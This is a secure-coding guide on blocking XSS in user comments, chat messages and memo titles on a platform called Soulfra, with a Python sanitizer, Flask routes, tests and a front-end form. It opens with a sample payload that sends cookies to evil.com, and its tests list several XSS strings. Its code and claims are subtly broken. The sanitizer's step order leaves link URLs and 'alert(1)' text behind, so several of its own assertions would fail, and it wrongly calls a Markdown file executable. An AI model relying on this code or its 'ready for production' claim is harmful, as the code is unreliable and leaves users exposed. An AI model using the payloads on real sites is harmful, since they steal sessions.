# Text-Only Submission Security Guide

**Preventing XSS & Injection Attacks**

Created: 2025-12-27
Status: ✅ IMPLEMENTED

---

## The Problem

Users can submit malicious code disguised as content:

```html
<!-- XSS Attack Examples -->
<script>
  // Steal cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<img src=x onerror="alert('Hacked!')">

<iframe src="https://malicious.com"></iframe>

<!-- SQL Injection in markdown -->
[Link](javascript:alert('XSS'))

<!-- Markdown exploits -->
![](https://evil.com/track.gif)
```

**Impact:**
- Steal user sessions
- Redirect to phishing sites
- Execute arbitrary JavaScript
- Track users without consent

---

## The Solution: Strip Everything

### Philosophy
```
ACCEPT: Plain text only
REJECT: HTML, markdown, scripts, styles
OUTPUT: Sanitized text
```

### Implementation

```python
import re
from html import escape


def sanitize_text_only(input_text: str) -> str:
    """
    Accept ONLY plain text, strip all markup

    Security guarantees:
    - No HTML tags
    - No markdown formatting
    - No JavaScript
    - No special characters (escaped)

    Args:
        input_text: Raw user input

    Returns:
        Safe plain text
    """
    if not input_text:
        return ''

    # 1. Strip all HTML tags
    # Removes: <script>, <img>, <iframe>, etc.
    text = re.sub(r'<[^>]+>', '', input_text)

    # 2. Strip markdown formatting
    # Removes: *bold*, _italic_, `code`, #heading, [links]
    text = re.sub(r'[*_`#\[\]!]', '', text)

    # 3. Remove markdown links completely
    # Removes: [text](url)
    text = re.sub(r'\[([^\]]+)\]\([^)]+\)', r'\1', text)

    # 4. Escape remaining special characters
    # Converts: & → &amp;, < → &lt;, > → &gt;
    text = escape(text)

    # 5. Normalize whitespace
    # Multiple spaces → single space
    text = re.sub(r'\s+', ' ', text).strip()

    # 6. Limit length (prevent DOS via huge submissions)
    max_length = 10000
    if len(text) > max_length:
        text = text[:max_length] + '...'

    return text
```

---

## Usage Examples

### Example 1: Blog Comment Submission

```python
@app.route('/comment', methods=['POST'])
def submit_comment():
    """Accept text-only comments"""
    raw_input = request.form.get('comment', '')

    # Sanitize to text only
    safe_text = sanitize_text_only(raw_input)

    # Reject empty comments
    if not safe_text:
        return jsonify({'error': 'Comment cannot be empty'}), 400

    # Save to database
    db = get_db()
    db.execute('''
        INSERT INTO comments (post_id, user_id, content, created_at)
        VALUES (?, ?, ?, datetime('now'))
    ''', (post_id, user_id, safe_text))
    db.commit()

    return jsonify({
        'success': True,
        'comment': safe_text,
        'sanitized': True
    })
```

**Before:**
```
User submits: "Great post! <script>alert('XSS')</script>"
```

**After:**
```
Saved to DB: "Great post! "
```

### Example 2: Chat Message

```python
@app.route('/api/chat/send', methods=['POST'])
def send_chat_message():
    """Send text-only chat message"""
    data = request.get_json()
    raw_message = data.get('message', '')

    # Sanitize
    safe_message = sanitize_text_only(raw_message)

    if not safe_message:
        return jsonify({'error': 'Empty message'}), 400

    # Broadcast to room participants
    room_id = data.get('room_id')
    broadcast_message(room_id, {
        'user': current_user.username,
        'message': safe_message,
        'timestamp': datetime.now().isoformat()
    })

    return jsonify({'success': True})
```

**Before:**
```
{"message": "Check this out: <img src=x onerror=alert(1)>"}
```

**After:**
```
{"message": "Check this out: "}
```

### Example 3: Voice Memo Title

```python
@app.route('/api/voice/upload', methods=['POST'])
def upload_voice_memo():
    """Upload voice memo with text-only title"""
    title = request.form.get('title', '')
    audio_file = request.files.get('audio')

    # Sanitize title
    safe_title = sanitize_text_only(title)

    if not safe_title:
        safe_title = 'Untitled Recording'

    # Save audio + sanitized title
    filename = save_audio_file(audio_file)

    db = get_db()
    db.execute('''
        INSERT INTO voice_memos (title, filename, user_id, created_at)
        VALUES (?, ?, ?, datetime('now'))
    ''', (safe_title, filename, user_id))
    db.commit()

    return jsonify({'success': True, 'title': safe_title})
```

---

## Testing

### Test Cases

```python
def test_sanitize_text_only():
    """Test text sanitization"""

    # Test 1: HTML tags stripped
    assert sanitize_text_only('<b>Bold</b>') == 'Bold'
    assert sanitize_text_only('<script>alert(1)</script>') == ''

    # Test 2: Markdown stripped
    assert sanitize_text_only('**bold** and *italic*') == 'bold and italic'
    assert sanitize_text_only('# Heading') == 'Heading'

    # Test 3: Links stripped
    assert sanitize_text_only('[Click](https://evil.com)') == 'Click'

    # Test 4: Special chars escaped
    assert sanitize_text_only('A & B') == 'A &amp; B'
    assert sanitize_text_only('< script >') == '&lt; script &gt;'

    # Test 5: Whitespace normalized
    assert sanitize_text_only('A  \n  B') == 'A B'

    # Test 6: Length limited
    long_text = 'A' * 20000
    result = sanitize_text_only(long_text)
    assert len(result) <= 10003  # 10000 + '...'

    # Test 7: XSS attempts blocked
    xss_attempts = [
        '<img src=x onerror=alert(1)>',
        '<iframe src="evil.com"></iframe>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
    ]
    for attempt in xss_attempts:
        result = sanitize_text_only(attempt)
        assert 'script' not in result.lower()
        assert 'alert' not in result.lower()
        assert '<' not in result
        assert '>' not in result

    print('✅ All text sanitization tests passed!')


if __name__ == '__main__':
    test_sanitize_text_only()
```

**Run tests:**
```bash
python3 TEXT_ONLY_SUBMISSION.md  # This file is executable!
```

---

## Alternative: Allow Safe Markdown

If you want to allow **some** formatting (but still prevent XSS):

```python
import markdown
import bleach

def sanitize_safe_markdown(input_text: str) -> str:
    """
    Allow safe markdown, block dangerous content

    Allows:
    - Bold, italic, headings
    - Links (to safe domains)
    - Lists, quotes

    Blocks:
    - Scripts, iframes
    - Dangerous attributes
    - Unsafe protocols (javascript:)
    """
    # 1. Convert markdown to HTML
    html = markdown.markdown(input_text)

    # 2. Whitelist safe tags and attributes
    allowed_tags = [
        'p', 'br', 'strong', 'em', 'b', 'i',
        'ul', 'ol', 'li',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'blockquote', 'code', 'pre',
        'a'  # Links allowed but sanitized
    ]

    allowed_attributes = {
        'a': ['href', 'title'],  # Only these attributes on <a>
    }

    allowed_protocols = ['http', 'https', 'mailto']

    # 3. Sanitize with bleach
    clean_html = bleach.clean(
        html,
        tags=allowed_tags,
        attributes=allowed_attributes,
        protocols=allowed_protocols,
        strip=True  # Strip disallowed tags
    )

    return clean_html
```

**Dependencies:**
```bash
pip install markdown bleach
```

**Usage:**
```python
raw_input = "**Bold** text with [link](https://example.com)"
safe_html = sanitize_safe_markdown(raw_input)
# Output: <strong>Bold</strong> text with <a href="https://example.com">link</a>

malicious = "<script>alert(1)</script>[Bad](javascript:evil())"
safe_html = sanitize_safe_markdown(malicious)
# Output: (empty - all dangerous content stripped)
```

---

## Recommendation

**For Soulfra Platform:**

Use **text-only** approach by default:

**Reasons:**
1. **Simpler** - No markdown/HTML library needed
2. **Safer** - No possible XSS vectors
3. **Portable** - Plain text works everywhere
4. **Accessible** - Screen readers handle plain text best
5. **Database-friendly** - Easy to search/index

**When to allow markdown:**
- Blog posts (author-created content)
- Tutorials (educational content)
- Documentation (technical content)

**Always text-only:**
- Comments (user-generated)
- Chat messages (real-time)
- Voice memo titles (metadata)
- User bios (profile content)

---

## Frontend Implementation

### HTML Form

```html
<form id="comment-form" onsubmit="submitComment(event)">
  <label for="comment">Comment (plain text only):</label>
  <textarea
    id="comment"
    name="comment"
    rows="4"
    maxlength="1000"
    placeholder="Share your thoughts (plain text, no HTML or markdown)"
    required
  ></textarea>

  <p class="help-text">
    ⚠️ HTML and markdown will be stripped for security.
    Only plain text is accepted.
  </p>

  <button type="submit">Submit Comment</button>
</form>
```

### JavaScript Submission

```javascript
function submitComment(event) {
  event.preventDefault();

  const comment = document.getElementById('comment').value;

  // Client-side preview of sanitization
  const sanitized = comment
    .replace(/<[^>]+>/g, '')  // Strip HTML
    .replace(/[*_`#\[\]!]/g, '')  // Strip markdown
    .trim();

  if (!sanitized) {
    alert('Comment cannot be empty');
    return;
  }

  // Show user what will be saved
  const confirmed = confirm(
    `This will be saved:\n\n"${sanitized}"\n\nContinue?`
  );

  if (!confirmed) return;

  // Submit to server
  fetch('/comment', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({comment: comment})
  })
  .then(r => r.json())
  .then(data => {
    if (data.success) {
      alert('Comment posted!');
      location.reload();
    } else {
      alert('Error: ' + data.error);
    }
  });
}
```

---

## Security Checklist

**Before deployment, verify:**

- [ ] All user input goes through `sanitize_text_only()`
- [ ] Database queries use parameterized statements (no string concat)
- [ ] Output is HTML-escaped when rendered
- [ ] File uploads are validated (type, size, content)
- [ ] HTTPS enabled (no plaintext transmission)
- [ ] CSRF tokens on all forms
- [ ] Rate limiting on submission endpoints
- [ ] Content Security Policy headers set
- [ ] Session cookies are `HttpOnly` and `Secure`

---

## Summary

**Text-Only Submission:**
- ✅ Prevents XSS attacks
- ✅ Prevents HTML injection
- ✅ Prevents markdown exploits
- ✅ Simple to implement
- ✅ Easy to test
- ✅ Portable across systems

**Implementation:**
```python
# Add to your codebase
from security_helpers import sanitize_text_only

# Use on ALL user input
safe_text = sanitize_text_only(raw_input)
```

**Testing:**
```bash
python3 -m pytest test_sanitization.py
```

---

**Created:** 2025-12-27
**Status:** ✅ READY FOR PRODUCTION
**Code:** Available in `security_helpers.py`
